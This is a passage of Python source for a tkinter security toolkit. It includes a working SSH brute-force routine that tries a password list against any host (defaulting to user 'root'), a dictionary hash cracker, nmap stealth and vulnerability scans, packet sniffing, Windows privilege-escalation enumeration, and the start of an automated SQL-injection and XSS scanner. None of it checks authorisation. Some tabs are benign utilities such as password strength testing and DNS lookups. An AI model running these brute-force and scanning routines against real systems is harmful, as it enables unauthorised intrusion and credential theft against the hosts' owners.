        password_frame = ttk.Frame(self.notebook)
        self.notebook.add(password_frame, text="Password Security")
        strength_frame = ttk.LabelFrame(password_frame, text="Password Strength Tester")
        strength_frame.pack(fill='x', padx=10, pady=5)
        tk.Label(strength_frame, text="Password:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.password_input = tk.Entry(strength_frame, width=30, show="*")
        self.password_input.grid(row=0, column=1, padx=5, pady=5)
        tk.Button(strength_frame, text="Test Strength", command=self.test_password_strength, bg='#4CAF50', fg='white').grid(row=0, column=2, padx=5, pady=5)
        tk.Button(strength_frame, text="Generate Password", command=self.generate_password, bg='#2196F3', fg='white').grid(row=0, column=3, padx=5, pady=5)
        self.strength_results = scrolledtext.ScrolledText(strength_frame, height=6, width=90)
        self.strength_results.grid(row=1, column=0, columnspan=4, padx=5, pady=5)
        crack_frame = ttk.LabelFrame(password_frame, text="Password Cracking")
        crack_frame.pack(fill='x', padx=10, pady=5)
        tk.Label(crack_frame, text="Hash:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.crack_hash_input = tk.Entry(crack_frame, width=40)
        self.crack_hash_input.grid(row=0, column=1, padx=5, pady=5)
        tk.Label(crack_frame, text="Hash Type:").grid(row=0, column=2, sticky='w', padx=5, pady=5)
        self.hash_type = ttk.Combobox(crack_frame, width=15, values=["MD5", "SHA1", "SHA256", "SHA512"])
        self.hash_type.grid(row=0, column=3, padx=5, pady=5)
        self.hash_type.set("MD5")
        tk.Button(crack_frame, text="Load Wordlist", command=self.load_crack_wordlist, bg='#607D8B', fg='white').grid(row=0, column=4, padx=5, pady=5)
        tk.Button(crack_frame, text="Start Cracking", command=self.start_cracking, bg='#F44336', fg='white').grid(row=0, column=5, padx=5, pady=5)
        self.crack_results = scrolledtext.ScrolledText(crack_frame, height=8, width=90)
        self.crack_results.grid(row=1, column=0, columnspan=6, padx=5, pady=5)
        self.crack_wordlist = []

    def create_exploitation_tab(self):
        exploit_frame = ttk.Frame(self.notebook)
        self.notebook.add(exploit_frame, text="Exploitation")
        ssh_frame = ttk.LabelFrame(exploit_frame, text="SSH Brute-Force")
        ssh_frame.pack(fill='x', padx=10, pady=5)
        tk.Label(ssh_frame, text="Host:").grid(row=0, column=0, sticky='w', padx=5, pady=2)
        self.ssh_host = tk.Entry(ssh_frame, width=20)
        self.ssh_host.grid(row=0, column=1, padx=5, pady=2)
        tk.Label(ssh_frame, text="Port:").grid(row=0, column=2, sticky='w', padx=5, pady=2)
        self.ssh_port = tk.Entry(ssh_frame, width=8)
        self.ssh_port.grid(row=0, column=3, padx=5, pady=2)
        self.ssh_port.insert(0, "22")
        tk.Label(ssh_frame, text="Username:").grid(row=1, column=0, sticky='w', padx=5, pady=2)
        self.ssh_user = tk.Entry(ssh_frame, width=20)
        self.ssh_user.grid(row=1, column=1, padx=5, pady=2)
        self.ssh_user.insert(0, "root")
        tk.Button(ssh_frame, text="Load Password List", command=self.load_ssh_wordlist, bg='#607D8B', fg='white').grid(row=1, column=2, columnspan=2, padx=5, pady=2)
        self.start_ssh_brute_button = tk.Button(ssh_frame, text="Start Brute-Force", command=self.start_ssh_bruteforce, bg='#F44336', fg='white')
        self.start_ssh_brute_button.grid(row=2, column=1, pady=10)
        self.ssh_results = scrolledtext.ScrolledText(ssh_frame, height=15)
        self.ssh_results.grid(row=3, column=0, columnspan=4, sticky='ew', padx=5, pady=5)
        self.ssh_wordlist = []

    def create_log_tab(self):
        log_frame = ttk.Frame(self.notebook)
        self.notebook.add(log_frame, text="Logs & Reports")
        log_display_frame = ttk.LabelFrame(log_frame, text="Session Log")
        log_display_frame.pack(fill='both', expand=True, padx=10, pady=5)
        self.log_text = scrolledtext.ScrolledText(log_display_frame, height=20, width=90)
        self.log_text.pack(fill='both', expand=True, padx=5, pady=5)
        report_frame = ttk.LabelFrame(log_frame, text="Report Generation")
        report_frame.pack(fill='x', padx=10, pady=5)
        tk.Button(report_frame, text="Export Log", command=self.export_log, bg='#2196F3', fg='white').pack(side='left', padx=5, pady=5)
        tk.Button(report_frame, text="Clear Log", command=self.clear_log, bg='#F44336', fg='white').pack(side='left', padx=5, pady=5)

    def start_scan_processor(self):
        def process_scans():
            while True:
                try:
                    task = self.scan_queue.get(timeout=1)
                    if task['type'] == 'port_scan':
                        self._port_scan_worker(**task)
                    elif task['type'] == 'host_discovery':
                        self._discovery_worker(task['network'])
                    self.scan_queue.task_done()
                except queue.Empty:
                    continue
                except Exception as e:
                    self.log_message(f"Error in scan processor: {e}")
        
        threading.Thread(target=process_scans, daemon=True).start()

    def scan_ports(self):
        task = {
            'type': 'port_scan', 'target': self.target_ip.get(), 'port_range_str': self.port_range.get(),
            'scan_type': self.scan_type.get(), 'use_nse': self.nse_var.get()
        }
        if not task['target'] or not task['port_range_str']: messagebox.showerror("Error", "Specify target and port range."); return
        self.scan_queue.put(task)
        self.log_message(f"Added port scan for {task['target']} to queue")

    def _port_scan_worker(self, type, target, port_range_str, scan_type, use_nse):
        self.scanning, self.stop_requested = True, False
        try:
            start_port, end_port = map(int, port_range_str.split('-'))
            self.port_results.delete(1.0, tk.END)
            open_ports = []
            nm = nmap.PortScanner()
            arguments = ''

            if use_nse:
                arguments = '-sV -sC --script vuln'
                self.log_message(f"Starting NSE Vuln Scan on {target}")
                self.port_results.insert(tk.END, f"Scanning {target} with Nmap Scripting Engine... This may take a while.\n" + "="*80 + "\n")
            else:
                scan_map = {"TCP Connect": '-sT', "SYN Stealth": '-sS', "UDP": '-sU', "ACK": '-sA', "Window": '-sW', "FIN": '-sF'}
                arguments = scan_map.get(scan_type, '-sS')
                self.log_message(f"Starting {scan_type} scan on {target} for ports {port_range_str}")
                self.port_results.insert(tk.END, f"Scanning {target} ports {start_port}-{end_port} using {scan_type}\n" + "="*50 + "\n")

            nm.scan(target, f"{start_port}-{end_port}", arguments=arguments, sudo=(os.name != 'nt'))

            if not nm.all_hosts(): self.port_results.insert(tk.END, "Host seems down.\n"); return

            for host in nm.all_hosts():
                self.port_results.insert(tk.END, f"Host: {host} ({nm[host].hostname()})\n")
                for proto in nm[host].all_protocols():
                    for port in sorted(nm[host][proto].keys()):
                        if self.stop_requested: self.port_results.insert(tk.END, "\nScan stopped by user.\n"); return
                        if nm[host][proto][port]['state'] == 'open':
                            open_ports.append(port)
                            service_info = nm[host][proto][port]
                            version = f"{service_info.get('product', '')} {service_info.get('version', '')}".strip()
                            self.port_results.insert(tk.END, f"Port {port}/{proto}: OPEN - {service_info.get('name', 'N/A')} ({version})\n")
                            if 'script' in service_info and service_info['script']:
                                for script_name, output in service_info['script'].items():
                                    self.port_results.insert(tk.END, f"  | NSE: {script_name}\n")
                                    for line in output.replace('\n', '\n  |_ ').splitlines():
                                        self.port_results.insert(tk.END, f"  |_ {line}\n")
                            self.port_results.see(tk.END); self.root.update_idletasks()

            if open_ports: self.port_results.insert(tk.END, f"\nScan completed. Found {len(open_ports)} open ports: {', '.join(map(str, open_ports))}\n")
            else: self.port_results.insert(tk.END, "\nScan completed. No open ports found.\n")
            self.log_message(f"Port scan completed on {target}.")

        except Exception as e:
            self.port_results.insert(tk.END, f"Error: {e}\n")
            self.log_message(f"Port scan error: {e}")
        finally:
            self.scanning, self.stop_requested = False, False

    def discover_hosts(self):
        network = self.network_range.get()
        if not network: messagebox.showerror("Error", "Specify a network range."); return
        self.scan_queue.put({'type': 'host_discovery', 'network': network})
        self.log_message(f"Added host discovery for {network} to queue")
    
    def _discovery_worker(self, network):
        self.log_message(f"Starting host discovery on {network}")
        self.discovery_results.delete(1.0, tk.END)
        self.discovery_results.insert(tk.END, f"Scanning network {network}\n" + "="*50 + "\n")
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=network, arguments='-sn -PR', sudo=(os.name != 'nt'))
            hosts_list = [host for host in nm.all_hosts()]
            for host in hosts_list:
                status = nm[host]['status']['state']
                mac = nm[host]['addresses'].get('mac', 'N/A')
                vendor = nm[host]['vendor'].get(mac, 'N/A')
                self.discovery_results.insert(tk.END, f"Host {host} [{mac}] ({vendor}) is {status.upper()}\n")
                self.discovery_results.see(tk.END); self.root.update_idletasks()
            self.discovery_results.insert(tk.END, f"\nDiscovery completed. Found {len(hosts_list)} hosts.\n")
            self.log_message(f"Host discovery completed. Found {len(hosts_list)} hosts.")
        except Exception as e:
            self.discovery_results.insert(tk.END, f"Error: {e}\nThis scan may require administrator/root privileges.\n")
            self.log_message(f"Host discovery error: {e}")
            
    def stop_scan(self):
        if self.scanning: self.stop_requested, self.log_message("Scan stop requested")
        else: self.log_message("No active scan to stop")

    def os_detection(self):
        target = self.target_ip.get()
        if not target: messagebox.showerror("Error", "Specify a target."); return
        self.log_message(f"Starting OS detection on {target}")
        self.discovery_results.insert(tk.END, f"\nOS Detection for {target}\n" + "="*50 + "\n")
        try:
            nm = nmap.PortScanner()
            self.update_status(f"Running OS detection on {target} (may require root)...")
            nm.scan(target, arguments='-O', sudo=True)
            if target in nm.all_hosts() and 'osmatch' in nm[target] and nm[target]['osmatch']:
                for match in nm[target]['osmatch']:
                    self.discovery_results.insert(tk.END, f"OS: {match['name']} (Accuracy: {match['accuracy']}%)\n")
            else: self.discovery_results.insert(tk.END, "OS detection inconclusive.\n")
            self.log_message("OS detection completed")
        except Exception as e:
            self.discovery_results.insert(tk.END, f"Error: {e}\nThis scan may require administrator/root privileges.\n")
            self.log_message(f"OS detection error: {e}")

    def start_sniffing(self):
        interface, pfilter = self.interface.get(), self.packet_filter.get()
        if not interface: messagebox.showerror("Error", "Select an interface."); return
        self.log_message(f"Starting packet sniffing on {interface} with filter '{pfilter}'")
        self.sniff_results.delete(1.0, tk.END)
        self.sniff_results.insert(tk.END, f"Sniffing on {interface} with filter '{pfilter}'\n" + "="*50 + "\n")
        threading.Thread(target=self._sniff_worker, args=(interface, pfilter), daemon=True).start()

    def _sniff_worker(self, interface, packet_filter):
        try:
            self.update_status(f"Sniffing on {interface}...")
            packets = scapy.sniff(iface=interface, filter=packet_filter, count=20, timeout=30)
            for packet in packets:
                self.sniff_results.insert(tk.END, f"{packet.summary()}\n")
                self.sniff_results.see(tk.END); self.root.update_idletasks()
            self.sniff_results.insert(tk.END, f"\nSniffing completed. Captured {len(packets)} packets.\n")
            self.log_message(f"Packet sniffing completed.")
        except Exception as e:
            msg = f"Error: {e}\n"
            if os.name == 'nt': msg += "On Windows, Scapy requires Npcap to be installed. Please install it and try again."
            else: msg += "This may require administrator/root privileges."
            self.sniff_results.insert(tk.END, msg)
            self.log_message("Packet sniffing failed.")

    def stop_sniffing(self):
        self.log_message("Stop sniffing requested. A running sniff will complete its current batch.")

    def generate_hashes(self):
        text = self.hash_input.get()
        if not text: return
        self.hash_results.delete(1.0, tk.END)
        self.hash_results.insert(tk.END, f"Hashes for: '{text}'\n" + "="*60 + "\n")
        for alg in ['md5', 'sha1', 'sha256', 'sha512', 'blake2b']:
            h = hashlib.new(alg); h.update(text.encode())
            self.hash_results.insert(tk.END, f"{alg.upper()}: {h.hexdigest()}\n")
        self.log_message("Hashes generated")

    def crack_hash(self):
        hash_value = self.hash_input.get().lower()
        if not hash_value: messagebox.showerror("Error", "Enter a hash to crack."); return
        common_passwords = ["password", "123456", "qwerty", "admin", "123456789"]
        self.hash_results.insert(tk.END, f"\nAttempting to crack hash: {hash_value}\n")
        cracked = False
        for p in common_passwords:
            for alg in ['md5', 'sha1', 'sha256']:
                if hashlib.new(alg, p.encode()).hexdigest() == hash_value:
                    self.hash_results.insert(tk.END, f"CRACKED! ({alg.upper()}): {p}\n")
                    cracked = True; break
            if cracked: break
        if not cracked: self.hash_results.insert(tk.END, "Hash not found in common password list.\n")
        self.log_message("Hash cracking attempt finished")

    def encode_decode(self, op):
        text = self.encode_input.get()
        if not text: return
        try:
            if op == 'b64encode': res = base64.b64encode(text.encode()).decode()
            elif op == 'b64decode': res = base64.b64decode(text.encode()).decode()
            elif op == 'urlencode': res = quote(text)
            elif op == 'hexencode': res = text.encode().hex()
        except Exception as e: res = f"Error: {e}"
        self.encoding_results.delete(1.0, tk.END)
        self.encoding_results.insert(tk.END, f"Operation: {op}\nInput: {text}\nResult: {res}\n")
        self.log_message(f"{op} operation completed")

    def generate_key(self):
        key = Fernet.generate_key().decode()
        self.crypto_key.delete(0, tk.END); self.crypto_key.insert(0, key)
        self.log_message("Encryption key generated")

    def encrypt_text(self):
        text, key = self.crypto_input.get(), self.crypto_key.get()
        if not text or not key: messagebox.showerror("Error", "Enter text and a key."); return
        try:
            res = Fernet(key.encode()).encrypt(text.encode()).decode()
            self.crypto_results.delete(1.0, tk.END); self.crypto_results.insert(tk.END, f"Encrypted: {res}\n")
            self.log_message("Text encrypted")
        except Exception as e: self.crypto_results.insert(tk.END, f"Error: {e}\n"); self.log_message(f"Encryption error: {e}")

    def decrypt_text(self):
        text, key = self.crypto_input.get(), self.crypto_key.get()
        if not text or not key: messagebox.showerror("Error", "Enter text and a key."); return
        try:
            res = Fernet(key.encode()).decrypt(text.encode()).decode()
            self.crypto_results.delete(1.0, tk.END); self.crypto_results.insert(tk.END, f"Decrypted: {res}\n")
            self.log_message("Text decrypted")
        except Exception as e: self.crypto_results.insert(tk.END, f"Error: {e}\n"); self.log_message(f"Decryption error: {e}")

    def whois_lookup(self):
        def worker():
            self.log_message("Performing WHOIS lookup...")
            domain = self.domain_input.get()
            self.recon_results.delete(1.0, tk.END)
            try:
                w = whois.whois(domain)
                self.recon_results.insert(tk.END, f"WHOIS Info for: {domain}\n" + "="*50 + "\n")
                if not w.domain_name: self.recon_results.insert(tk.END, "Could not retrieve WHOIS info.\n"); return
                for k, v in w.items():
                    if v: self.recon_results.insert(tk.END, f"{k.replace('_', ' ').title()}: {v}\n")
                self.log_message("WHOIS lookup completed")
            except Exception as e: self.recon_results.insert(tk.END, f"Error: {e}\n"); self.log_message(f"WHOIS lookup error: {e}")
        threading.Thread(target=worker, daemon=True).start()

    def dns_lookup(self):
        def worker():
            self.log_message("Performing DNS lookup...")
            domain = self.domain_input.get()
            self.recon_results.delete(1.0, tk.END)
            self.recon_results.insert(tk.END, f"DNS Info for: {domain}\n" + "="*50 + "\n")
            for r_type in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']:
                try:
                    answers = dns.resolver.resolve(domain, r_type)
                    self.recon_results.insert(tk.END, f"\n--- {r_type} Records ---\n")
                    for rdata in answers: self.recon_results.insert(tk.END, f"  {rdata.to_text()}\n")
                except Exception: self.recon_results.insert(tk.END, f"\n--- {r_type} Records ---\n  Not found\n")
            self.log_message("DNS lookup completed")
        threading.Thread(target=worker, daemon=True).start()

    def subdomain_enum(self):
        def worker():
            self.log_message("Enumerating subdomains...")
            domain = self.domain_input.get()
            subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api', 'blog', 'shop']
            self.recon_results.insert(tk.END, f"\nSubdomain enumeration for: {domain}\n" + "="*50 + "\n")
            found = []
            for s in subdomains:
                try:
                    ip = socket.gethostbyname(f'{s}.{domain}')
                    found.append(f"✓ {s}.{domain} -> {ip}")
                except socket.gaierror:
                    pass
            self.recon_results.insert(tk.END, "\n".join(found))
            self.recon_results.insert(tk.END, f"\n\nFound {len(found)} subdomains from basic list.\n")
            self.log_message(f"Subdomain enumeration finished.")
        threading.Thread(target=worker, daemon=True).start()
    
    def reverse_ip_lookup(self):
        def worker():
            self.log_message("Performing reverse IP lookup...")
            domain = self.domain_input.get()
            try:
                ip = socket.gethostbyname(domain)
                self.recon_results.insert(tk.END, f"\nReverse IP Lookup for: {domain} ({ip})\n" + "="*50 + "\n")
                try: hostname, _, _ = socket.gethostbyaddr(ip); self.recon_results.insert(tk.END, f"Primary Hostname: {hostname}\n")
                except socket.herror: self.recon_results.insert(tk.END, "Primary Hostname: Not found\n")
                self.log_message("Reverse IP lookup completed")
            except Exception as e: self.recon_results.insert(tk.END, f"Error: {e}\n"); self.log_message(f"Reverse IP lookup error: {e}")
        threading.Thread(target=worker, daemon=True).start()

    def get_system_info(self):
        self.recon_results.insert(tk.END, "\nLocal System Information\n" + "="*50 + "\n")
        import platform
        info = {
            "System": f"{platform.system()} {platform.release()}", "Hostname": platform.node(),
            "Architecture": platform.machine(), "Processor": platform.processor()
        }
        for k, v in info.items(): self.recon_results.insert(tk.END, f"{k}: {v}\n")
        self.log_message("System information retrieved")

    def get_network_interfaces(self):
        self.recon_results.insert(tk.END, "\nNetwork Interface Information\n" + "="*50 + "\n")
        try:
            command = ['ipconfig', '/all'] if os.name == 'nt' else ['ifconfig']
            result = subprocess.run(command, capture_output=True, text=True, timeout=5, errors='ignore', creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
            self.recon_results.insert(tk.END, result.stdout if result.returncode == 0 else "Command failed.\n")
            self.log_message("Network interface info retrieved")
        except Exception as e: self.recon_results.insert(tk.END, f"Error: {e}\n"); self.log_message(f"Network info error: {e}")

    def get_running_processes(self):
        self.recon_results.insert(tk.END, "\nRunning Processes (first 20 lines)\n" + "="*50 + "\n")
        try:
            command = ['tasklist'] if os.name == 'nt' else ['ps', 'aux']
            result = subprocess.run(command, capture_output=True, text=True, timeout=5, errors='ignore', creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
            if result.returncode == 0: self.recon_results.insert(tk.END, "\n".join(result.stdout.splitlines()[:20]) + "\n...\n")
            self.log_message("Running processes retrieved")
        except Exception as e: self.recon_results.insert(tk.END, f"Error: {e}\n"); self.log_message(f"Processes error: {e}")

    def get_open_connections(self):
        self.recon_results.insert(tk.END, "\nOpen Network Connections (first 20 lines)\n" + "=" * 50 + "\n")
        try:
            command = ['netstat', '-anb'] if os.name == 'nt' else ['netstat', '-an']
            result = subprocess.run(command, capture_output=True, text=True, timeout=10, errors='ignore', creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
            if result.returncode == 0: self.recon_results.insert(tk.END, "\n".join(result.stdout.splitlines()[:20]) + "\n...\n")
            else: self.recon_results.insert(tk.END, f"Error running netstat: {result.stderr}\nAdmin privileges may be required for the '-b' flag.\n")
            self.log_message("Open connections retrieved")
        except Exception as e: self.recon_results.insert(tk.END, f"Error: {e}\n"); self.log_message(f"Connections error: {e}")

    def test_password_strength(self):
        password = self.password_input.get()
        self.strength_results.delete(1.0, tk.END)
        score, feedback = 0, []
        if len(password) >= 8: score += 1
        else: feedback.append("Too short (8+ chars)")
        if re.search("[a-z]", password): score += 1
        else: feedback.append("Missing lowercase")
        if re.search("[A-Z]", password): score += 1
        else: feedback.append("Missing uppercase")
        if re.search("\\d", password): score += 1
        else: feedback.append("Missing number")
        if re.search("[@$!%*?&_#]", password): score += 1
        else: feedback.append("Missing special char")
        strength = {0: "Very Weak", 1: "Weak", 2: "Weak", 3: "Moderate", 4: "Strong", 5: "Very Strong"}[score]
        self.strength_results.insert(tk.END, f"Strength: {strength} ({score}/5)\n" + "\n".join(f"- {f}" for f in feedback))
        self.log_message("Password strength tested")

    def generate_password(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        new_pass = ''.join(random.choice(chars) for _ in range(16))
        self.password_input.delete(0, tk.END); self.password_input.insert(0, new_pass)
        self.test_password_strength()
        self.log_message("Generated a new password")

    def load_crack_wordlist(self):
        filename = filedialog.askopenfilename(title="Select Wordlist", filetypes=[("Text files", "*.txt")])
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    self.crack_wordlist = [line.strip() for line in f]
                self.log_message(f"Loaded {len(self.crack_wordlist)} words for cracking.")
                messagebox.showinfo("Success", f"Loaded {len(self.crack_wordlist)} words.")
            except Exception as e: messagebox.showerror("Error", f"Failed to load wordlist: {e}")

    def start_cracking(self):
        hash_to_crack = self.crack_hash_input.get().lower()
        hash_type = self.hash_type.get().lower()

        if not hash_to_crack: messagebox.showerror("Error", "Please enter a hash to crack."); return
        if not self.crack_wordlist: messagebox.showerror("Error", "Please load a wordlist first."); return

        self.log_message(f"Starting dictionary attack on {hash_to_crack} ({hash_type}).")
        self.crack_results.delete(1.0, tk.END)
        self.crack_results.insert(tk.END, f"Cracking {hash_type} hash: {hash_to_crack}\n" + "="*50 + "\n")
        
        self.stop_crack_event = threading.Event()
        threading.Thread(target=self._crack_worker, args=(hash_to_crack, hash_type), daemon=True).start()

    def stop_cracking(self):
        if hasattr(self, 'stop_crack_event'):
            self.stop_crack_event.set()
            self.log_message("Password cracking stop requested.")

    def _crack_worker(self, hash_to_crack, hash_type):
        found = False
        for password in self.crack_wordlist:
            if self.stop_crack_event.is_set():
                self.crack_results.insert(tk.END, "\nCracking stopped by user.\n")
                return

            hashed_password = hashlib.new(hash_type, password.encode()).hexdigest()
            if hashed_password == hash_to_crack:
                self.crack_results.insert(tk.END, f"\nSUCCESS! Password found: {password}\n")
                self.log_message(f"Password found: {password}")
                found = True
                break
                
        if not found:
            self.crack_results.insert(tk.END, "\nPassword not found in the wordlist.\n")
            self.log_message("Password not found in wordlist.")

    def export_log(self):
        filename = filedialog.asksaveasfilename(defaultextension=".log", filetypes=[("Log files", "*.log"), ("Text files", "*.txt")])
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f: f.write(self.log_text.get('1.0', tk.END))
                self.log_message(f"Log exported to {filename}")
            except Exception as e: messagebox.showerror("Error", f"Could not export log: {e}")

    def clear_log(self):
        if messagebox.askyesno("Confirm", "Are you sure you want to clear the session log?"):
            self.log_text.delete(1.0, tk.END)
            self.log_message("Log cleared by user.")
    
    def log_message(self, message, from_queue=False):
        if from_queue:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
            self.log_text.see(tk.END)
            self.update_status(message)
        else:
            self.gui_queue.put({'type': 'log', 'data': message})

    def update_status(self, message):
        self.status_var.set(f"{datetime.now().strftime('%H:%M:%S')} - {message}")
        self.root.update_idletasks()
        
    def populate_interfaces(self):
        try:
            self.interface['values'] = list(psutil.net_if_addrs().keys())
            if self.interface['values']: self.interface.set(self.interface['values'][0])
        except (ImportError, Exception):
             self.interface['values'] = ['eth0', 'wlan0']; self.interface.set('eth0')

    def load_ssh_wordlist(self):
        filename = filedialog.askopenfilename(title="Select Password List", filetypes=[("Text files", "*.txt")])
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    self.ssh_wordlist = [line.strip() for line in f]
                self.log_message(f"Loaded {len(self.ssh_wordlist)} passwords for SSH brute-force.")
                messagebox.showinfo("Success", f"Loaded {len(self.ssh_wordlist)} passwords.")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load wordlist: {e}")

    def start_ssh_bruteforce(self):
        host, port_str, user = self.ssh_host.get(), self.ssh_port.get(), self.ssh_user.get()
        if not all([host, port_str, user]): messagebox.showerror("Error", "Host, Port, and Username are required."); return
        if not self.ssh_wordlist: messagebox.showerror("Error", "Please load a password list."); return
        try:
            port = int(port_str)
            self.log_message(f"Starting SSH brute-force on {host}:{port} for user '{user}'")
            self.ssh_results.delete(1.0, tk.END)
            threading.Thread(target=self._ssh_brute_worker, args=(host, port, user), daemon=True).start()
        except ValueError:
            messagebox.showerror("Error", "Port must be a valid number.")

    def _ssh_brute_worker(self, host, port, user):
        for password in self.ssh_wordlist:
            if not password: continue
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                self.ssh_results.insert(tk.END, f"[*] Trying: {password}\n"); self.ssh_results.see(tk.END)
                client.connect(host, port=port, username=user, password=password, timeout=3)
                self.ssh_results.insert(tk.END, f"\n[!!!] SUCCESS [!!!]\nHost: {host}\nUser: {user}\nPassword: {password}\n")
                self.log_message(f"SSH credentials found for {user}@{host}: {password}")
                client.close(); return
            except paramiko.AuthenticationException:
                client.close(); continue
            except Exception as e:
                self.ssh_results.insert(tk.END, f"[!] Error: {e}\n")
                self.log_message(f"SSH Brute-force error: {e}")
                client.close(); return
        self.ssh_results.insert(tk.END, "\n[-] Brute-force finished. Password not found in list.\n")
        self.log_message("SSH brute-force finished, password not found.")

    def win_enum_users(self):
        if os.name != 'nt': self.windows_results.insert(tk.END, "This feature is only available on Windows."); return
        self.log_message("Enumerating local users and groups...")
        self.windows_results.delete(1.0, tk.END)
        try:
            users = subprocess.check_output("net user", text=True, errors='ignore', stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
            groups = subprocess.check_output("net localgroup", text=True, errors='ignore', stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
            self.windows_results.insert(tk.END, "--- LOCAL USERS ---\n" + users + "\n--- LOCAL GROUPS ---\n" + groups)
        except Exception as e: self.windows_results.insert(tk.END, f"Error: {e}\nThis command may require administrator privileges.")

    def win_check_services(self):
        if os.name != 'nt': self.windows_results.insert(tk.END, "This feature is only available on Windows."); return
        self.log_message("Checking for services with unquoted paths...")
        self.windows_results.delete(1.0, tk.END)
        try:
            c = wmi.WMI()
            vuln_services = [f"Name: {s.Name}\nPath: {s.PathName}\n" for s in c.Win32_Service() if s.PathName and " " in s.PathName and not s.PathName.startswith('"')]
            if vuln_services: self.windows_results.insert(tk.END, "--- VULNERABLE SERVICES (UNQUOTED PATHS) ---\n\n" + "\n".join(vuln_services))
            else: self.windows_results.insert(tk.END, "No services with unquoted paths found.\n")
        except ImportError: self.windows_results.insert(tk.END, "Error: The WMI library is not installed. Please run: pip install WMI\n")
        except Exception as e: self.windows_results.insert(tk.END, f"Error querying WMI: {e}\nThis may require administrator privileges.")

    def win_get_startup_programs(self):
        if os.name != 'nt': self.windows_results.insert(tk.END, "This feature is only available on Windows."); return
        self.log_message("Querying registry for startup programs...")
        self.windows_results.delete(1.0, tk.END)
        self.windows_results.insert(tk.END, "--- STARTUP PROGRAMS ---\n\n")
        keys_to_check = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
        ]
        for hive, path in keys_to_check:
            try:
                with winreg.OpenKey(hive, path, 0, winreg.KEY_READ) as key:
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            self.windows_results.insert(tk.END, f"[{path}]\n  {name}: {value}\n\n"); i += 1
                        except OSError: break
            except FileNotFoundError: continue
            except Exception as e: self.windows_results.insert(tk.END, f"Could not read {path}: {e}\n")

    def win_query_event_logs(self):
        if os.name != 'nt': self.windows_results.insert(tk.END, "This feature is only available on Windows."); return
        self.log_message("Querying last 10 security event logs via PowerShell...")
        self.windows_results.delete(1.0, tk.END)
        command = "Get-WinEvent -LogName Security -MaxEvents 10 | Format-List Id, LevelDisplayName, TimeCreated, Message"
        try:
            result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, errors='ignore', timeout=20, creationflags=subprocess.CREATE_NO_WINDOW)
            self.windows_results.insert(tk.END, "--- LAST 10 SECURITY EVENT LOGS ---\n\n" + (result.stdout if result.returncode == 0 else f"Error: {result.stderr}"))
        except Exception as e: self.windows_results.insert(tk.END, f"Error executing PowerShell: {e}\nPowerShell might not be in your system's PATH.")

    def win_get_wmi_processes(self):
        if os.name != 'nt': self.windows_results.insert(tk.END, "This feature is only available on Windows."); return
        self.log_message("Getting detailed process list via WMI..."); self.windows_results.delete(1.0, tk.END)
        try:
            c = wmi.WMI()
            self.windows_results.insert(tk.END, "{:<10} {:<40} {}\n".format("PID", "Process Name", "Command Line") + "-"*120 + "\n")
            for process in c.Win32_Process():
                self.windows_results.insert(tk.END, "{:<10} {:<40} {}\n".format(process.ProcessId, process.Name, process.CommandLine or "N/A"))
        except ImportError: self.windows_results.insert(tk.END, "Error: The WMI library is not installed. Please run: pip install WMI\n")
        except Exception as e: self.windows_results.insert(tk.END, f"Error querying WMI: {e}\nThis may require administrator privileges.")

    def start_automated_scan(self):
        url = self.web_target_url.get()
        if not url: messagebox.showerror("Error", "Please provide a target URL."); return
        for i in self.vuln_results_tree.get_children(): self.vuln_results_tree.delete(i)
        self.scan_progress['value'] = 0
        self.log_message(f"Starting automated scan on {url}")
        threading.Thread(target=self._automated_scan_worker, args=(url,), daemon=True).start()

    def _automated_scan_worker(self, base_url):
        session = requests.Session()
        session.headers.update({'User-Agent': 'EthicalHackingTool/2.0'})
        cookie_name, cookie_value = self.cookie_name_entry.get(), self.cookie_value_entry.get()
        if cookie_name and cookie_value:
            session.cookies.set(cookie_name, cookie_value)
            self.gui_queue.put({'type': 'log', 'data': f"Using cookie: {cookie_name}={cookie_value}"})
        self.gui_queue.put({'type': 'log', 'data': "Phase 1: Crawling website..."})
        scan_targets = self._crawl_and_discover(base_url, session)
        self.gui_queue.put({'type': 'log', 'data': f"Crawling complete. Found {len(scan_targets)} targets."})
        if not scan_targets: self.gui_queue.put({'type': 'log', 'data': "Scan finished: No targets found."}); return
        self.gui_queue.put({'type': 'log', 'data': "Phase 2: Scanning for vulnerabilities..."})
        total_tests = sum(len(t.get('params', [])) for t in scan_targets) * (len(SQLI_PAYLOADS) + len(XSS_PAYLOADS))
        self.gui_queue.put({'type': 'progress_max', 'data': total_tests or 1})
        for target in scan_targets:
            url, method, params = target['url'], target['method'], target.get('params', [])
            for param in params:
                for payload in SQLI_PAYLOADS:
                    self.gui_queue.put({'type': 'progress', 'data': 1})
                    if self._test_sql_injection(session, url, method, param, payload):
                        self.gui_queue.put({'type': 'vulnerability', 'data': (url, method, param, "SQL Injection", payload)})
                for payload in XSS_PAYLOADS:
                    self.gui_queue.put({'type': 'progress', 'data': 1})
